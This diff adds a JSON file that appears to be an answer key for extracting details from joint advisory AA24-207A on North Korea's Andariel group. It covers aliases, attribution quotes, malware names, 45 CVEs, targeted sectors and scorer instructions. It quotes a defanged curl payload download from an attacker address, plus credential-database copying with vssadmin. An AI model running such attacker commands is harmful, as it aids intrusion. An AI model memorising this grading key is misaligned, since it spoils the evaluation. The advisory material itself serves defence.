@@ -1,0 +1,891 @@
+{
+ "case_id": "AA24-207A",
+ "authoring_agencies": [
+  {
+   "name": "U.S. Federal Bureau of Investigation (FBI)",
+   "quote": "U.S. Federal Bureau of Investigation (FBI)"
+  },
+  {
+   "name": "U.S. Cyber National Mission Force (CNMF)",
+   "quote": "U.S. Cyber National Mission Force (CNMF)"
+  },
+  {
+   "name": "U.S. Cybersecurity and Infrastructure Security Agency (CISA)",
+   "quote": "U.S. Cybersecurity and Infrastructure Security Agency (CISA)"
+  },
+  {
+   "name": "U.S. Department of Defense Cyber Crime Center (DC3)",
+   "quote": "U.S. Department of Defense Cyber Crime Center (DC3)"
+  },
+  {
+   "name": "U.S. National Security Agency (NSA)",
+   "quote": "U.S. National Security Agency (NSA)"
+  },
+  {
+   "name": "Republic of Korea’s National Intelligence Service (NIS)",
+   "quote": "Republic of Korea’s National Intelligence Service (NIS)"
+  },
+  {
+   "name": "Republic of Korea’s National Police Agency (NPA)",
+   "quote": "Republic of Korea’s National Police Agency (NPA)"
+  },
+  {
+   "name": "United Kingdom’s National Cyber Security Centre (NCSC)",
+   "quote": "United Kingdom’s National Cyber Security Centre (NCSC)"
+  }
+ ],
+ "actor_designations": [
+  {
+   "name": "Andariel",
+   "kind": "primary",
+   "quote": "Andariel (also known as Onyx Sleet, formerly PLUTONIUM, DarkSeoul, Silent Chollima, and Stonefly/Clasiopa) is a North Korean state-sponsored cyber group"
+  },
+  {
+   "name": "Onyx Sleet",
+   "kind": "alias",
+   "quote": "known publicly as Andariel, Onyx Sleet (formerly PLUTONIUM), DarkSeoul, Silent Chollima, and Stonefly/Clasiopa"
+  },
+  {
+   "name": "PLUTONIUM",
+   "kind": "alias",
+   "quote": "known publicly as Andariel, Onyx Sleet (formerly PLUTONIUM), DarkSeoul, Silent Chollima, and Stonefly/Clasiopa"
+  },
+  {
+   "name": "DarkSeoul",
+   "kind": "alias",
+   "quote": "known publicly as Andariel, Onyx Sleet (formerly PLUTONIUM), DarkSeoul, Silent Chollima, and Stonefly/Clasiopa"
+  },
+  {
+   "name": "Silent Chollima",
+   "kind": "alias",
+   "quote": "known publicly as Andariel, Onyx Sleet (formerly PLUTONIUM), DarkSeoul, Silent Chollima, and Stonefly/Clasiopa"
+  },
+  {
+   "name": "Stonefly",
+   "kind": "alias",
+   "quote": "known publicly as Andariel, Onyx Sleet (formerly PLUTONIUM), DarkSeoul, Silent Chollima, and Stonefly/Clasiopa"
+  },
+  {
+   "name": "Clasiopa",
+   "kind": "alias",
+   "quote": "known publicly as Andariel, Onyx Sleet (formerly PLUTONIUM), DarkSeoul, Silent Chollima, and Stonefly/Clasiopa"
+  },
+  {
+   "name": "RGB 3rd Bureau",
+   "kind": "unit",
+   "quote": "is a North Korean state-sponsored cyber group, under the RGB 3rd Bureau, based in Pyongyang and Sinuiju"
+  },
+  {
+   "name": "Reconnaissance General Bureau (RGB)",
+   "kind": "parent_organization",
+   "quote": "the Democratic People’s Republic of Korea (DPRK)’s Reconnaissance General Bureau (RGB) 3rd Bureau based in Pyongyang and Sinuiju"
+  }
+ ],
+ "attribution_statements": [
+  {
+   "quote": "to highlight cyber espionage activity associated with the Democratic People’s Republic of Korea (DPRK)’s Reconnaissance General Bureau (RGB) 3rd Bureau based in Pyongyang and Sinuiju",
+   "attributing_party": "FBI and the authoring partners",
+   "attributed_to": "DPRK Reconnaissance General Bureau (RGB) 3rd Bureau",
+   "strength_markers": [
+    "associated with"
+   ]
+  },
+  {
+   "quote": "The RGB 3 rd Bureau includes a DPRK (aka North Korean) state-sponsored cyber group known publicly as Andariel, Onyx Sleet (formerly PLUTONIUM), DarkSeoul, Silent Chollima, and Stonefly/Clasiopa.",
+   "attributing_party": "the authoring agencies",
+   "attributed_to": "DPRK RGB 3rd Bureau (state-sponsored group within it)",
+   "strength_markers": [
+    "includes",
+    "state-sponsored"
+   ]
+  },
+  {
+   "quote": "Andariel (also known as Onyx Sleet, formerly PLUTONIUM, DarkSeoul, Silent Chollima, and Stonefly/Clasiopa) is a North Korean state-sponsored cyber group, under the RGB 3rd Bureau, based in Pyongyang and Sinuiju.",
+   "attributing_party": "the authoring agencies",
+   "attributed_to": "North Korea; RGB 3rd Bureau",
+   "strength_markers": [
+    "is a North Korean state-sponsored cyber group",
+    "under the RGB 3rd Bureau"
+   ]
+  },
+  {
+   "quote": "RGB 3 rd Bureau actors fund their espionage activity through ransomware operations against U.S. healthcare entities.",
+   "attributing_party": "the authoring agencies",
+   "attributed_to": "RGB 3rd Bureau actors (ransomware operations funding espionage)",
+   "strength_markers": [
+    "fund"
+   ]
+  },
+  {
+   "quote": "The authoring agencies assess the group has evolved from conducting destructive attacks targeting U.S. and South Korean organizations to conducting specialized cyber espionage and ransomware operations.",
+   "attributing_party": "the authoring agencies",
+   "attributed_to": "the group (Andariel): evolution of its activity",
+   "strength_markers": [
+    "assess",
+    "has evolved"
+   ]
+  },
+  {
+   "quote": "leads the authoring agencies to assess one of the group’s chief responsibilities as satisfying collection requirements for Pyongyang’s nuclear and defense programs",
+   "attributing_party": "the authoring agencies",
+   "attributed_to": "Pyongyang's nuclear and defense programs (collection requirements)",
+   "strength_markers": [
+    "assess",
+    "chief responsibilities"
+   ]
+  },
+  {
+   "quote": "The authoring agencies are reliant on the use of custom malware and loaders, along with overlapping C2 nodes to attribute commodity malware to the actors.",
+   "attributing_party": "the authoring agencies",
+   "attributed_to": "the actors (method for attributing commodity malware)",
+   "strength_markers": [
+    "reliant on",
+    "attribute"
+   ]
+  },
+  {
+   "quote": "The use of publicly available malware and dual-use applications enables the actors to conceal and obfuscate their identities and leads to attribution problems.",
+   "attributing_party": "the authoring agencies",
+   "attributed_to": "the actors (attribution caveat)",
+   "strength_markers": [
+    "attribution problems"
+   ]
+  },
+  {
+   "quote": "should remain vigilant in defending their networks from North Korea state-sponsored cyber operations",
+   "attributing_party": "the authoring agencies",
+   "attributed_to": "North Korea (generic state sponsorship)",
+   "strength_markers": [
+    "state-sponsored"
+   ]
+  }
+ ],
+ "attribution_strength_code": "A3",
+ "attribution_strength_rationale": "The activity is tied to a named state organ: 'cyber espionage activity associated with the ... (DPRK)'s Reconnaissance General Bureau (RGB) 3rd Bureau', and 'Andariel ... is a North Korean state-sponsored cyber group, under the RGB 3rd Bureau'; the assertive 'is ... under the RGB 3rd Bureau' and 'The RGB 3rd Bureau includes' outweigh the softer 'associated with', so A3.",
+ "malware_tools": [
+  {
+   "name": "Atharvan",
+   "category": "custom_malware",
+   "core": true,
+   "quote": "Atharvan"
+  },
+  {
+   "name": "ELF Backdoor",
+   "category": "custom_malware",
+   "core": true,
+   "quote": "ELF Backdoor"
+  },
+  {
+   "name": "Jupiter",
+   "category": "custom_malware",
+   "core": true,
+   "quote": "Jupiter"
+  },
+  {
+   "name": "MagicRAT",
+   "category": "custom_malware",
+   "core": true,
+   "quote": "MagicRAT"
+  },
+  {
+   "name": "No Pineapple",
+   "category": "custom_malware",
+   "core": true,
+   "quote": "“No Pineapple”"
+  },
+  {
+   "name": "TigerRAT",
+   "category": "custom_malware",
+   "core": true,
+   "quote": "TigerRAT"
+  },
+  {
+   "name": "Valefor/VSingle",
+   "category": "custom_malware",
+   "core": true,
+   "quote": "Valefor/VSingle"
+  },
+  {
+   "name": "ValidAlpha",
+   "category": "custom_malware",
+   "core": true,
+   "quote": "ValidAlpha"
+  },
+  {
+   "name": "YamaBot",
+   "category": "custom_malware",
+   "core": true,
+   "quote": "YamaBot"
+  },
+  {
+   "name": "NukeSped",
+   "category": "custom_malware",
+   "core": true,
+   "quote": "NukeSped"
+  },
+  {
+   "name": "Goat RAT",
+   "category": "custom_malware",
+   "core": true,
+   "quote": "Goat RAT"
+  },
+  {
+   "name": "Black RAT",
+   "category": "custom_malware",
+   "core": true,
+   "quote": "Black RAT"
+  },
+  {
+   "name": "AndarLoader",
+   "category": "custom_malware",
+   "core": true,
+   "quote": "AndarLoader"
+  },
+  {
+   "name": "DurianBeacon",
+   "category": "custom_malware",
+   "core": true,
+   "quote": "DurianBeacon"
+  },
+  {
+   "name": "Trifaux",
+   "category": "custom_malware",
+   "core": true,
+   "quote": "Trifaux"
+  },
+  {
+   "name": "KaosRAT",
+   "category": "custom_malware",
+   "core": true,
+   "quote": "KaosRAT"
+  },
+  {
+   "name": "Preft",
+   "category": "custom_malware",
+   "core": true,
+   "quote": "Preft"
+  },
+  {
+   "name": "Andariel Scheduled Task Malware",
+   "category": "custom_malware",
+   "core": true,
+   "quote": "Andariel Scheduled Task Malware"
+  },
+  {
+   "name": "BottomLoader",
+   "category": "custom_malware",
+   "core": true,
+   "quote": "BottomLoader (see Cisco Talos blog Operation Blacksmith)"
+  },
+  {
+   "name": "NineRAT",
+   "category": "custom_malware",
+   "core": true,
+   "quote": "NineRAT (see Cisco Talos blog Operation Blacksmith)"
+  },
+  {
+   "name": "DLang",
+   "category": "custom_malware",
+   "core": true,
+   "quote": "DLang (see Cisco Talos blog Operation Blacksmith)"
+  },
+  {
+   "name": "Nestdoor",
+   "category": "custom_malware",
+   "core": true,
+   "quote": "Nestdoor (see AhnLab blog)"
+  },
+  {
+   "name": "Mimikatz",
+   "category": "commodity_or_open_source_tool",
+   "core": true,
+   "quote": "perform privilege escalation using common credential stealing tools such as Mimikatz"
+  },
+  {
+   "name": "web shells (generic; deployed after web server exploitation)",
+   "category": "other",
+   "core": true,
+   "quote": "to deploy a web shell and gain access to sensitive information and applications for further exploitation"
+  },
+  {
+   "name": "3Proxy",
+   "category": "commodity_or_open_source_tool",
+   "core": false,
+   "quote": "They also use tunneling tools such as 3Proxy, PLINK, and Stunnel as well as custom proxy tunneling tools"
+  },
+  {
+   "name": "AdFind",
+   "category": "commodity_or_open_source_tool",
+   "core": false,
+   "quote": "AdFind"
+  },
+  {
+   "name": "AsyncRAT",
+   "category": "commodity_or_open_source_tool",
+   "core": false,
+   "quote": "AsyncRAT"
+  },
+  {
+   "name": "DeimosC2",
+   "category": "commodity_or_open_source_tool",
+   "core": false,
+   "quote": "DeimosC2"
+  },
+  {
+   "name": "Impacket",
+   "category": "commodity_or_open_source_tool",
+   "core": false,
+   "quote": "Impacket"
+  },
+  {
+   "name": "Juggernaut",
+   "category": "commodity_or_open_source_tool",
+   "core": false,
+   "quote": "Juggernaut"
+  },
+  {
+   "name": "Lilith RAT",
+   "category": "commodity_or_open_source_tool",
+   "core": false,
+   "quote": "Lilith RAT"
+  },
+  {
+   "name": "ORVX Web Shell",
+   "category": "commodity_or_open_source_tool",
+   "core": false,
+   "quote": "ORVX Web Shell"
+  },
+  {
+   "name": "PLINK",
+   "category": "commodity_or_open_source_tool",
+   "core": false,
+   "quote": "They also use tunneling tools such as 3Proxy, PLINK, and Stunnel as well as custom proxy tunneling tools"
+  },
+  {
+   "name": "ProcDump",
+   "category": "rmm_or_legit_software",
+   "core": false,
+   "quote": "the use of publicly available credential theft utilities and dual-use tools such as Mimikatz, Dumpert, and ProcDump"
+  },
+  {
+   "name": "PuTTY",
+   "category": "rmm_or_legit_software",
+   "core": false,
+   "quote": "The actors have also been observed using the utilities PuTTY and WinSCP to exfiltrate data to North Korea-controlled servers"
+  },
+  {
+   "name": "SOCKS5",
+   "category": "other",
+   "core": false,
+   "quote": "SOCKS5"
+  },
+  {
+   "name": "Stunnel",
+   "category": "commodity_or_open_source_tool",
+   "core": false,
+   "quote": "They also use tunneling tools such as 3Proxy, PLINK, and Stunnel as well as custom proxy tunneling tools"
+  },
+  {
+   "name": "Web Shell by Orb (WSO)",
+   "category": "commodity_or_open_source_tool",
+   "core": false,
+   "quote": "Web Shell by Orb (WSO)"
+  },
+  {
+   "name": "WinRAR",
+   "category": "rmm_or_legit_software",
+   "core": false,
+   "quote": "sometimes using a version of WinRAR brought into the victim’s environment with other malicious tooling"
+  },
+  {
+   "name": "WinSCP",
+   "category": "rmm_or_legit_software",
+   "core": false,
+   "quote": "The actors have also been observed using the utilities PuTTY and WinSCP to exfiltrate data to North Korea-controlled servers"
+  },
+  {
+   "name": "RDP Wrapper",
+   "category": "commodity_or_open_source_tool",
+   "core": false,
+   "quote": "RDP Wrapper"
+  },
+  {
+   "name": "Dumpert",
+   "category": "commodity_or_open_source_tool",
+   "core": false,
+   "quote": "the use of publicly available credential theft utilities and dual-use tools such as Mimikatz, Dumpert, and ProcDump"
+  },
+  {
+   "name": "VMProtect",
+   "category": "other",
+   "core": false,
+   "quote": "The actors routinely pack late-stage tooling in VMProtect and Themida."
+  },
+  {
+   "name": "Themida",
+   "category": "other",
+   "core": false,
+   "quote": "The actors routinely pack late-stage tooling in VMProtect and Themida."
+  },
+  {
+   "name": "Scheduled Tasks",
+   "category": "built_in_os_utility",
+   "core": false,
+   "quote": "establish persistence using Scheduled Tasks"
+  },
+  {
+   "name": "Windows command line",
+   "category": "built_in_os_utility",
+   "core": false,
+   "quote": "They use Windows command line, PowerShell, Windows Management Instrumentation command line (WMIC), and Linux bash, for system, network, and account enumeration."
+  },
+  {
+   "name": "PowerShell",
+   "category": "built_in_os_utility",
+   "core": false,
+   "quote": "They use Windows command line, PowerShell, Windows Management Instrumentation command line (WMIC), and Linux bash, for system, network, and account enumeration."
+  },
+  {
+   "name": "Windows Management Instrumentation command line (WMIC)",
+   "category": "built_in_os_utility",
+   "core": false,
+   "quote": "They use Windows command line, PowerShell, Windows Management Instrumentation command line (WMIC), and Linux bash, for system, network, and account enumeration."
+  },
+  {
+   "name": "Linux bash",
+   "category": "built_in_os_utility",
+   "core": false,
+   "quote": "They use Windows command line, PowerShell, Windows Management Instrumentation command line (WMIC), and Linux bash, for system, network, and account enumeration."
+  },
+  {
+   "name": "netstat",
+   "category": "built_in_os_utility",
+   "core": false,
+   "quote": "the authoring agencies assess the actors prefer netstat commands, such as netstat –naop and netstat –noa"
+  },
+  {
+   "name": "vssadmin",
+   "category": "built_in_os_utility",
+   "core": false,
+   "quote": "the actors used the vssadmin command-line utility to back up a volume to retrieve a copy of the NTDS.dit file"
+  },
+  {
+   "name": "Remote Desktop Protocol (RDP)",
+   "category": "built_in_os_utility",
+   "core": false,
+   "quote": "The actors have also used Remote Desktop Protocol (RDP) to move laterally."
+  },
+  {
+   "name": "curl",
+   "category": "built_in_os_utility",
+   "core": false,
+   "quote": "curl hxxp[://][IP Address]/tmp/tmp/comp[.]dat"
+  },
+  {
+   "name": "systeminfo",
+   "category": "built_in_os_utility",
+   "core": false,
+   "quote": "systeminfo | findstr Logon"
+  },
+  {
+   "name": "findstr",
+   "category": "built_in_os_utility",
+   "core": false,
+   "quote": "systeminfo | findstr Logon"
+  },
+  {
+   "name": "Maui ransomware (only in the title of a cross-referenced advisory)",
+   "category": "ransomware",
+   "core": false,
+   "quote": "North Korean State-Sponsored Cyber Actors Use Maui Ransomware to Target the Healthcare and Public Health Sector"
+  }
+ ],
+ "vulnerabilities": [
+  {
+   "cve": "CVE-2023-46604",
+   "product": "Apache ActiveMQ",
+   "core": false,
+   "quote": "CVE-2023-46604 – Apache ActiveMQ"
+  },
+  {
+   "cve": "CVE-2023-42793",
+   "product": "TeamCity",
+   "core": false,
+   "quote": "CVE-2023-42793 – TeamCity"
+  },
+  {
+   "cve": "CVE-2023-3519",
+   "product": "Citrix NetScaler",
+   "core": false,
+   "quote": "CVE-2023-3519 – Citrix NetScaler"
+  },
+  {
+   "cve": "CVE-2023-35078",
+   "product": "Ivanti Endpoint Manager Mobile (EPMM)",
+   "core": false,
+   "quote": "CVE-2023-35078 – Ivanti Endpoint Manager Mobile (EPMM)"
+  },
+  {
+   "cve": "CVE-2023-34362",
+   "product": "MOVEIt",
+   "core": false,
+   "quote": "CVE-2023-34362 – MOVEIt"
+  },
+  {
+   "cve": "CVE-2023-33246",
+   "product": "RocketMQ",
+   "core": false,
+   "quote": "CVE-2023-33246 – RocketMQ"
+  },
+  {
+   "cve": "CVE-2023-32784",
+   "product": "KeePass",
+   "core": false,
+   "quote": "CVE-2023-32784 – KeePass"
+  },
+  {
+   "cve": "CVE-2023-32315",
+   "product": "Openfire",
+   "core": false,
+   "quote": "CVE-2023-32315 – Openfire"
+  },
+  {
+   "cve": "CVE-2023-3079",
+   "product": "Google Chromium V8 Type Confusion",
+   "core": false,
+   "quote": "CVE-2023-3079 – Google Chromium V8 Type Confusion"
+  },
+  {
+   "cve": "CVE-2023-28771",
+   "product": "Zyxell firmware",
+   "core": false,
+   "quote": "CVE-2023-28771 and CVE-2023-33010 – Zyxell firmware"
+  },
+  {
+   "cve": "CVE-2023-33010",
+   "product": "Zyxell firmware",
+   "core": false,
+   "quote": "CVE-2023-28771 and CVE-2023-33010 – Zyxell firmware"
+  },
+  {
+   "cve": "CVE-2023-2868",
+   "product": "Barracuda Email Security Gateway",
+   "core": false,
+   "quote": "CVE-2023-2868 – Barracuda Email Security Gateway"
+  },
+  {
+   "cve": "CVE-2023-27997",
+   "product": "FortiGate SSL VPN",
+   "core": false,
+   "quote": "CVE-2023-27997 – FortiGate SSL VPN"
+  },
+  {
+   "cve": "CVE-2023-25690",
+   "product": "Apache HTTP Server",
+   "core": false,
+   "quote": "CVE-2023-25690 – Apache HTTP Server"
+  },
+  {
+   "cve": "CVE-2023-21932",
+   "product": "Oracle Hospitality Opera 5",
+   "core": false,
+   "quote": "CVE-2023-21932 – Oracle Hospitality Opera 5"
+  },
+  {
+   "cve": "CVE-2023-0669",
+   "product": "GoAnywhere MFT",
+   "core": false,
+   "quote": "CVE-2023-0669 – GoAnywhere MFT"
+  },
+  {
+   "cve": "CVE-2022-47966",
+   "product": "ManageEngine",
+   "core": false,
+   "quote": "CVE-2022-47966 – ManageEngine"
+  },
+  {
+   "cve": "CVE-2022-41352",
+   "product": "Zimbra Collaboration Suite",
+   "core": false,
+   "quote": "CVE-2022-41352 and CVE-2022-27925 – Zimbra Collaboration Suite"
+  },
+  {
+   "cve": "CVE-2022-27925",
+   "product": "Zimbra Collaboration Suite",
+   "core": false,
+   "quote": "CVE-2022-41352 and CVE-2022-27925 – Zimbra Collaboration Suite"
+  },
+  {
+   "cve": "CVE-2022-30190",
+   "product": "Microsoft Windows Support Diagnostic Tool",
+   "core": false,
+   "quote": "CVE-2022-30190 – Microsoft Windows Support Diagnostic Tool"
+  },
+  {
+   "cve": "CVE-2022-25064",
+   "product": "TP-LINK",
+   "core": false,
+   "quote": "CVE-2022-25064 – TP-LINK"
+  },
+  {
+   "cve": "CVE-2022-24990",
+   "product": "TerraMaster NAS",
+   "core": false,
+   "quote": "CVE-2022-24990 and CVE-2021-45837 – TerraMaster NAS"
+  },
+  {
+   "cve": "CVE-2021-45837",
+   "product": "TerraMaster NAS",
+   "core": false,
+   "quote": "CVE-2022-24990 and CVE-2021-45837 – TerraMaster NAS"
+  },
+  {
+   "cve": "CVE-2022-24785",
+   "product": "Moment.js",
+   "core": false,
+   "quote": "CVE-2022-24785 – Moment.js"
+  },
+  {
+   "cve": "CVE-2022-24665",
+   "product": "PHP Everywhere",
+   "core": false,
+   "quote": "CVE-2022-24665, CVE-2022-24664, and CVE-2022-24663 – PHP Everywhere"
+  },
+  {
+   "cve": "CVE-2022-24664",
+   "product": "PHP Everywhere",
+   "core": false,
+   "quote": "CVE-2022-24665, CVE-2022-24664, and CVE-2022-24663 – PHP Everywhere"
+  },
+  {
+   "cve": "CVE-2022-24663",
+   "product": "PHP Everywhere",
+   "core": false,
+   "quote": "CVE-2022-24665, CVE-2022-24664, and CVE-2022-24663 – PHP Everywhere"
+  },
+  {
+   "cve": "CVE-2022-22965",
+   "product": "Spring4Shell",
+   "core": false,
+   "quote": "CVE-2022-22965 – Spring4Shell"
+  },
+  {
+   "cve": "CVE-2022-22947",
+   "product": "Spring Cloud Gateway",
+   "core": false,
+   "quote": "CVE-2022-22947 – Spring Cloud Gateway"
+  },
+  {
+   "cve": "CVE-2022-22005",
+   "product": "Microsoft SharePoint Server",
+   "core": false,
+   "quote": "CVE-2022-22005 – Microsoft SharePoint Server"
+  },
+  {
+   "cve": "CVE-2022-21882",
+   "product": "Win32k Elevation of Privilege",
+   "core": false,
+   "quote": "CVE-2022-21882 – Win32k Elevation of Privilege"
+  },
+  {
+   "cve": "CVE-2021-44228",
+   "product": "Apache Log4j (\"Log4Shell\"); explicitly exploited for initial access",
+   "core": true,
+   "quote": "CVE-2021-44228 (“Log4Shell”) in Apache’s Log4j software library"
+  },
+  {
+   "cve": "CVE-2021-44142",
+   "product": "Samba vfs_fruit module",
+   "core": false,
+   "quote": "CVE-2021-44142 – Samba vfs_fruit module"
+  },
+  {
+   "cve": "CVE-2021-43226",
+   "product": "Windows log file vulnerabilities",
+   "core": false,
+   "quote": "CVE-2021-43226, CEV-2021-43207, CVE-2021-36955 – Windows log file vulnerabilities"
+  },
+  {
+   "cve": "CVE-2021-43207",
+   "product": "Windows log file vulnerabilities (written 'CEV-2021-43207' in the text)",
+   "core": false,
+   "quote": "CVE-2021-43226, CEV-2021-43207, CVE-2021-36955 – Windows log file vulnerabilities"
+  },
+  {
+   "cve": "CVE-2021-36955",
+   "product": "Windows log file vulnerabilities",
+   "core": false,
+   "quote": "CVE-2021-43226, CEV-2021-43207, CVE-2021-36955 – Windows log file vulnerabilities"
+  },
+  {
+   "cve": "CVE-2021-41773",
+   "product": "Apache HTTP Server 2.4.49",
+   "core": false,
+   "quote": "CVE-2021-41773 – Apache HTTP Server 2.4.49"
+  },
+  {
+   "cve": "CVE-2021-40684",
+   "product": "Talend ESB Runtime",
+   "core": false,
+   "quote": "CVE-2021-40684 – Talend ESB Runtime"
+  },
+  {
+   "cve": "CVE-2021-3018",
+   "product": "IPeakCMS 3.5",
+   "core": false,
+   "quote": "CVE-2021-3018 – IPeakCMS 3.5"
+  },
+  {
+   "cve": "CVE-2021-20038",
+   "product": "SMA100 Apache httpd server (SonicWall)",
+   "core": false,
+   "quote": "CVE-2021-20038 – SMA100 Apache httpd server (SonicWall)"
+  },
+  {
+   "cve": "CVE-2021-20028",
+   "product": "SonicWall Secure Remote Access (SRA)",
+   "core": false,
+   "quote": "CVE-2021-20028 – SonicWall Secure Remote Access (SRA)"
+  },
+  {
+   "cve": "CVE-2019-15637",
+   "product": "Tableau",
+   "core": false,
+   "quote": "CVE-2019-15637 – Tableau"
+  },
+  {
+   "cve": "CVE-2019-7609",
+   "product": "Kibana",
+   "core": false,
+   "quote": "CVE-2019-7609 – Kibana"
+  },
+  {
+   "cve": "CVE-2019-0708",
+   "product": "Microsoft Remote Desktop Services",
+   "core": false,
+   "quote": "CVE-2019-0708 – Microsoft Remote Desktop Services"
+  },
+  {
+   "cve": "CVE-2017-4946",
+   "product": "VMware V4H and V4PA",
+   "core": false,
+   "quote": "CVE-2017-4946 – VMware V4H and V4PA"
+  }
+ ],
+ "affected_products_or_technologies": [
+  {
+   "name": "web servers (exploited via known vulnerabilities for initial access)",
+   "core": true,
+   "quote": "The actors gain initial access through widespread exploitation of web servers through known vulnerabilities in software, such as Log4j"
+  },
+  {
+   "name": "Microsoft Windows Shortcut File (LNK) files (malicious phishing attachments)",
+   "core": true,
+   "quote": "including Microsoft Windows Shortcut File (LNK) files or HTML Application (HTA) script files inside encrypted or unencrypted zip archives"
+  },
+  {
+   "name": "HTML Application (HTA) script files (malicious phishing attachments)",
+   "core": true,
+   "quote": "including Microsoft Windows Shortcut File (LNK) files or HTML Application (HTA) script files inside encrypted or unencrypted zip archives"
+  },
+  {
+   "name": "public-facing devices",
+   "core": false,
+   "quote": "The actors continue to breach organizations by exploiting web server vulnerabilities in public-facing devices"
+  },
+  {
+   "name": "Active Directory domain database (NTDS.dit file)",
+   "core": false,
+   "quote": "accessing the Active Directory domain database through targeting of the NTDS.dit file"
+  }
+ ],
+ "target_sectors": [
+  {
+   "sector": "defense",
+   "core": true,
+   "quote": "The group primarily targets defense, aerospace, nuclear, and engineering entities"
+  },
+  {
+   "sector": "aerospace",
+   "core": true,
+   "quote": "The group primarily targets defense, aerospace, nuclear, and engineering entities"
+  },
+  {
+   "sector": "nuclear",
+   "core": true,
+   "quote": "The group primarily targets defense, aerospace, nuclear, and engineering entities"
+  },
+  {
+   "sector": "engineering",
+   "core": true,
+   "quote": "The group primarily targets defense, aerospace, nuclear, and engineering entities"
+  },
+  {
+   "sector": "healthcare (ransomware operations)",
+   "core": true,
+   "quote": "ransomware operations against U.S. healthcare entities"
+  },
+  {
+   "sector": "medical",
+   "core": false,
+   "quote": "To a lesser extent, the group targets medical and energy industries."
+  },
+  {
+   "sector": "energy",
+   "core": false,
+   "quote": "To a lesser extent, the group targets medical and energy industries."
+  },
+  {
+   "sector": "military",
+   "core": false,
+   "quote": "keywords related to defense and military sectors in English and Korean"
+  },
+  {
+   "sector": "critical infrastructure",
+   "core": false,
+   "quote": "The authoring agencies encourage critical infrastructure organizations to apply patches for vulnerabilities in a timely manner"
+  }
+ ],
+ "target_regions": [
+  {
+   "region": "United States",
+   "core": true,
+   "quote": "ransomware operations against U.S. healthcare entities"
+  },
+  {
+   "region": "South Korea",
+   "core": true,
+   "quote": "conducting destructive attacks targeting U.S. and South Korean organizations"
+  },
+  {
+   "region": "Japan",
+   "core": true,
+   "quote": "including but not limited to entities in their respective countries, as well as in Japan and India"
+  },
+  {
+   "region": "India",
+   "core": true,
+   "quote": "including but not limited to entities in their respective countries, as well as in Japan and India"
+  },
+  {
+   "region": "worldwide",
+   "core": true,
+   "quote": "remain an ongoing threat to various industry sectors worldwide"
+  },
+  {
+   "region": "the authoring agencies' respective countries",
+   "core": false,
+   "quote": "including but not limited to entities in their respective countries"
+  }
+ ],
+ "named_victims": [],
+ "dates": [
+  {
+   "expression": "Over the last 15 years",
+   "meaning": "period over which the group developed its RATs (relative; no calendar date)",
+   "core": false,
+   "quote": "Over the last 15 years, the group has developed RATs"
+  }
+ ],
+ "notes": "(1) The text writes 'CEV-2021-43207' (typo); keyed as CVE-2021-43207, so accept either spelling. 'Zyxell', 'MOVEIt' and 'Spring4Shell' are product labels as written. (2) All 45 CVEs are introduced as 'CVEs researched' (the actors research CVEs published to NIST NVD). Exploitation is stated explicitly only for CVE-2021-44228 ('Log4Shell') plus a generic 'and other CVEs listed above'; only Log4j appears in the summary, so it alone is core. (3) The 22 custom RATs/malware are ones the group developed 'Over the last 15 years' (a historical toolset, not tied to one intrusion). They are marked core as the actor-specific toolset; a scorer using a strict 'short summary' standard may relax them to 'some named custom malware'. Valefor/VSingle is a single entry. 'Operation Blacksmith' (a Cisco Talos blog) and the AhnLab blog are citations, not actor names. (4) Maui ransomware appears only in the title of a cross-referenced joint advisory; the text names no ransomware family used in this activity. (5) Not keyed as named tools: the unnamed custom .NET file-system enumeration tool, the 'custom proxy tunneling tools', pvhost.exe (appears only inside an example command line) and RAR/zip archives. Generic web shells are keyed as a category. SMB, FTP and HTTP are protocols, not tools. (6) 'Stonefly/Clasiopa' is written as one token and keyed as two aliases. PLUTONIUM is the former name of Onyx Sleet. (7) Pyongyang and Sinuiju are the actor's base, not targets. 'North Korea-controlled servers' and actor-controlled cloud storage are exfiltration destinations, and 'infrastructure positioned around the world' is actor infrastructure. (8) 'their respective countries' means the authoring agencies' countries (by the agency list: United States, Republic of Korea, United Kingdom); the text names Japan and India explicitly. (9) Not in the input: Table 1 (victimology/information targeted by industry), and the list after 'entities involved in or associated with the below industries and fields' (that sentence is left dangling). (10) The sentence 'The use of publicly available malware and dual-use applications.' is duplicated (garbled) in the text. 'Microsoft Cooperation' is a typo the advisory cites as evidence, not an entity. (11) No victims are named."
+}
